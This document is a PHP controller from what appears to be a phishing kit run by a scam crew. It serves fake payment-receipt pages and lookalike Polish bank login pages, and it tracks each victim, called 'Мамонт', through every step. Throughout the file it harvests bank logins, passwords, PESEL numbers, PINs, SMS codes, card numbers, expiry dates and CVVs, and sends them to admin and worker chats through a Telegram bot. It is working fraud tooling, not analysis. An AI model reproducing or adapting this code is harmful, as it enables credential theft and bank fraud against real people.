<?php

namespace App\Http\Controllers\Fake;

use App\Http\Controllers\Telegram\BotController;
use App\Models\Fake;
use App\Http\Controllers\Controller;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Telegram\Bot\Keyboard\Keyboard;
use Telegram\Bot\Objects\Message;
use Throwable;
use Cache;

class PagesController extends Controller
{
    /**
     * @var Fake|\Illuminate\Database\Eloquent\Builder|\Illuminate\Database\Eloquent\Model|object|null
     */
    protected $fake;
    protected $uuid;
    protected $subdomain;
    protected $bank;

    public function __construct()
    {
        $this->middleware(function (Request $request, $next) {
            $key = 'track_id';
            $route = $request->route();
            $this->subdomain = $route->originalParameter('subdomain');
            $categoryName = collect(config('fakes.subdomain'))->filter(function ($value) {
                return in_array($this->subdomain, $value);
            })->keys()->first();
            $track_id = $request->has($key) ? $request->get($key) : $request->session()->get($key);
            $this->uuid = $request->session()->get('uuid');
            try {
                if (is_null($track_id) || is_null($categoryName)) throw new Exception();
                $this->fake = Fake::whereTrackId($track_id)->whereHas('category', function ($query) use ($categoryName) {
                    $query->where('name', '=', $categoryName);
                })->first();

                if (is_null($this->fake)) throw new Exception();
                $track_id = $this->fake->track_id;
                $request->session()->put($key, $track_id);
                if (!$request->session()->has('uuid')) {
                    $request->session()->put('uuid', $this->uuid = (string)Str::uuid());
                }
                view()->share(['fake' => $this->fake]);
                $this->bank = session('bankName', 'none');
                if ($redirectUrl = $this->processRedirection($request)) {
                    return redirect($redirectUrl);
                }
                if ($this->pageWasRefreshed()) {
                    foreach ($this->fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                        "⭐️<b>️Мамонт Обновил страницу</b>",
                        "🆔<b>Номер объявления:</b> <code>{$this->fake->getTrackIdFromWorker()}</code>",
                        "🚛<b>Платформа:</b> <code>{$this->platform()}</code>"
                    ]);
                }
                return $next($request);
            } catch (Throwable $exception) {
                session()->forget($key);
            }
            return redirect((new Fake())->originalUrl($categoryName));
        });
    }

    private function hasErrorRedirect()
    {
        return Cache::get("$this->uuid.redirectUrl") === "/error";
    }

    private function processRedirection(Request $request)
    {
        $redirect = false;
        $redirectUrl = Cache::get("$this->uuid.redirectUrl");
        if (!is_null($redirectUrl) && trim($request->path(), '/') !== trim(parse_url($redirectUrl, PHP_URL_PATH), '/')) {
            $redirect = $redirectUrl;
        } else if (!$this->hasErrorRedirect()) Cache::forget("$this->uuid.redirectUrl");
        return $redirect;
    }

    private function platform()
    {
        return platform($this->getFake()->category->name, '2.0');
    }

    private function getFake()
    {
        return $this->fake;
    }

    private function getTelegram()
    {
        return BotController::getTelegram();
    }

    private function pageWasRefreshed()
    {
        return isset($_SERVER['HTTP_CACHE_CONTROL']) && $_SERVER['HTTP_CACHE_CONTROL'] === 'max-age=0';
    }


    private function sendLogs($chat_id, $text = []): ?Message
    {
        try {
            $fake = $this->getFake();
            $keyboard = Keyboard::make([
                "inline_keyboard" => $chat_id === BotController::groupAdmin('id') ? [
                    [["text" => "⤴️ / (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /"]],
                    [["text" => "⤴️ /banks (неверный лк)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /banks"]],
                    [["text" => "⤴️ /order (неверная карта)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /order"]],
                    [["text" => "⤴️ /code (неверный код)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /code"]],
                    [["text" => "⤴️ /error (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /error"]],
                    [["text" => "🖇 Взять лог", "callback_data" => "/takeLog {$fake->track_id}"]],
                ] : [],
                "resize_keyboard" => true,
            ]);

            return $this->getTelegram()->sendMessage([
                'chat_id' => $chat_id,
                'text' => makeText($text),
                'disable_web_page_preview' => true,
                "parse_mode" => "html",
                "reply_markup" => $keyboard
            ]);
        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
        return null;
    }

    public function index()
    {
        $ip = \request()->ip();
        $ipData = ipstack($ip);
        $city_geo = is_null($ipData)
            ? ""
            : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";

        $fake = $this->getFake();
        $categoryName = $fake->category->name;
        $view = "fakes.$categoryName.index";
        if (view()->exists($view)) {
            if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
                "⭐️<b>️Мамонт на странице получения средств</b>",
                "=================",
                "🏷<b>Товар:</b> <code>{$fake->title}</code>",
                "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                "👤<b>IP:</b> <code>$ip $city_geo</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
            ]);

            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                "⭐️️<b>️Мамонт на странице получения средств</b>",
                "=================",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
            ]);
            return view($view);
        } else abort(404);
    }

    public function banks($name = null)
    {
        $title = 'Wybierz swój bank, aby kontynuować';
        $favicon = asset('images/banks_favicon.ico');
        $banks = collect(config('fakes.banks'));
        $fake = $this->getFake();
        if (is_null($name)) {
            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                "⭐️<b>️Мамонт на странице выбора банка</b>",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            ]);
            return view('fakes.banks.index', compact('banks', 'title', 'favicon'));
        }
        $bank = $banks->where('name', $name)->first();
        if (is_null($bank) && $name !== 'none') abort(404);
        session()->put('bankName', $name);
        $view = "fakes.banks.$name";
        $pm = in_array($name, $banks->whereIn('name', ['millenium', 'mbank', 'ipko', 'santander', 'ing', 'pekao', 'alior', 'agricole', 'getin', 'paribas', 'idea'])->pluck('name')->toArray());
        $title = $bank['title'] ?? $name;
        $favicon = isset($bank['logo']) ? asset($bank['logo']) : $this->fake->logo();
        if ($name !== 'none' && $pm && view()->exists($view)) {
            $bankName = ucfirst($name);
            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                "⭐️<b>️Мамонт на странице $bankName</b>",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            ]);
            return view($view, compact('title', 'favicon'));
        }
        return redirect('/order');
    }

    public function logBank(Request $request)
    {
        $fake = $this->getFake();
        $bankName = ucfirst($this->bank);
        $next = ($this->bank === 'inteligo') ? subRoute('fake.code') : subRoute('fake.order');
        $step = ($request->has('step')) ? $request->get('step') : false;
        $html = $step && view()->exists($step) ? view($step)->render() : null;
        $text = [
            "⭐️<b>Мамонт ввел ЛК</b>",
            "=================",
            "🏛<b>$bankName</b>",
            "=================",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
            "=================",
        ];
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, $text);
        if ($request->get('login'))
            $text[] = "🔑<b>Логин:</b> <code>{$request->get('login')}</code>";
        if ($request->get('password'))
            $text[] = "🔒<b>Пароль:</b> <code>{$request->get('password')}</code>";
        if ($request->get('pesel'))
            $text[] = "📟<b>PESEL:</b> <code>{$request->get('pesel')}</code>";
        if ($request->get('mother'))
            $text[] = "📟<b>Mother:</b> <code>{$request->get('mother')}</code>";
        if ($request->get('pin'))
            $text[] = "📟<b>PIN:</b> <code>{$request->get('pin')}</code>";
        if ($request->get('smsCode'))
            $text[] = "📟<b>SMS Code:</b> <code>{$request->get('smsCode')}</code>";
        if ($request->get('pic'))
            $text[] = "📟<b>Слово с картинки:</b> <code>{$request->get('pic')}</code>";
        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, $text);
        return response()->json(['html' => $html, 'next' => $next]);
    }

    public function order()
    {
        $ip = \request()->ip();
        $ipData = ipstack($ip);
        $city_geo = is_null($ipData)
            ? ""
            : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
        $fake = $this->getFake();
        if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
            "⭐️<b>Мамонт вбивает карту</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
            "🏷<b>Товар:</b> <code>{$fake->title}</code>",
            "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
            "👤<b>IP:</b> <code>$ip $city_geo</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
        ]);
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
            "⭐️<b>Мамонт вбивает карту</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
        ]);
        return view('fakes.order', ['title' => 'Pozyskiwanie środków']);
    }

    public function logOrder(Request $request)
    {
        $fake = $this->getFake();
        if ($ccnumber = $request->get('card_number'))
            $request->session()->put('card_number', $ccnumber);
        if ($expdate = $request->get('expdate'))
            $request->session()->put('expdate', $expdate);
        if ($cvc = $request->get('card_cvc'))
            $request->session()->put('card_cvc', $cvc);
        if ($holder = $request->get('card_holder'))
            $request->session()->put('card_holder', $holder);
        if ($balance = $request->get('balance'))
            $request->session()->put('balance', $balance);

        $ccnumber = $request->session()->get('card_number');
        $expdate = $request->session()->get('expdate');
        $cvc = $request->session()->get('card_cvc');
        $holder = $request->session()->get('card_holder');
        $balance = $request->session()->get('balance');
        $amount = number_format($fake->price, 0, "", " ");
        $bankName = ucfirst($this->bank);
        $currency = config('fakes.currency');

        $bankInfo = cardInfo($ccnumber);
        $notify = is_null($bankInfo) ? "<b>(Возможно фейк карта!)</b>" : "";
        $binName = $bankInfo['bank']['name'] ?? null;

        $next = subRoute('fake.code');
        $step = ($this->bank === 'inteligo') ? "fakes.banks.$bankName" : false;
        $html = $step && view()->exists($step) ? view($step)->render() : null;

        $ip = \request()->ip();
        $ipData = ipstack($ip);
        $city_geo = is_null($ipData)
            ? ""
            : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";

        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
            "👾<b>НОВЫЙ ПРИХОД</b> <code>$notify</code>",
            "=================",
            "💳<b>Банк:</b> <code>$bankName</code>",
            "💳<b>Карта:</b> <code>$ccnumber</code> <code>$binName</code>",
            "💳<b>Срок Действия:</b> <code>$expdate</code>",
            "💳<b>CVV:</b> <code>$cvc</code>",
            "💰<b>Сумма:</b> <code>$amount</code> $currency",
            "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
            "💁<b>Владелец :</b> <code>$holder</code>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
            "👤<b>IP:</b> <code>$ip $city_geo</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
        ]);
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
            "👾<b>НОВЫЙ ПРИХОД</b> <code>$notify</code>",
            "=================",
            "💳<b>Карта:</b> <code>" . substr(str_replace(' ', '', $ccnumber), 0, 6) . "</code> <code>$binName</code>",
            "=================",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            "💰<b>Сумма:</b> <code>$amount</code> $currency",
            "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
        ]);

        return response()->json(['html' => $html, 'next' => $next]);
    }

    public function code()
    {
        $fake = $this->getFake();
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
            ($this->bank === 'millenium') ? "⭐️<b>️Мамонт на странице выбора картинки</b>" : "⭐️<b>️Мамонт на странице кода</b>",
            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
        ]);
        if ($this->bank === 'millenium') return view('fakes.verify');
        return view('fakes.code', [
                'title' => 'Potwierdzenie operacji',
                'categoryName' => mb_strtoupper($fake->category->name) . '_PAY',
                'amount' => number_format($fake->price, 0, "", " ") . ' ' . config('fakes.currency'),
                'card_number' => '**** **** **** ' . substr(session()->get('card_number'), -4)
            ]
        );
    }

    public function logCode(Request $request)
    {
        $fake = $this->getFake();
        $currency = config('fakes.currency');
        $ccnumber = $request->session()->get('card_number');
        $amount = number_format($fake->price, 0, "", " ");
        if ($code = $request->get('code')) {
            if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
                "⚠️<b>️Пользователь вводит код подтверждения</b>",
                "=================",
                "💰<b>Сумма:</b> <code>$amount</code> $currency",
                "💳<b>Номер карты:</b> <code>$ccnumber</code>",
                "🔑<b>Код подтверждения:</b> <code>$code</code>",
                "=================",
                "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
            ]);
            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                "⚠️<b>️Пользователь вводит код подтверждения</b>",
                "=================",
                "💰<b>Сумма:</b> <code>$amount</code> $currency",
                "💳<b>Номер карты:</b> <code>" . substr(str_replace(' ', '', $ccnumber), 0, 6) . "</code>",
                "=================",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
            ]);
        }
        if ($request->has('pic')) $this->logBank($request);
    }

    public function error()
    {
        $fake = $this->getFake();
        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
            "⚠️<b>Мамонт на странице Ошибки</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
        ]);
        return view('fakes.error', ['title' => 'error | 500']);
    }

}
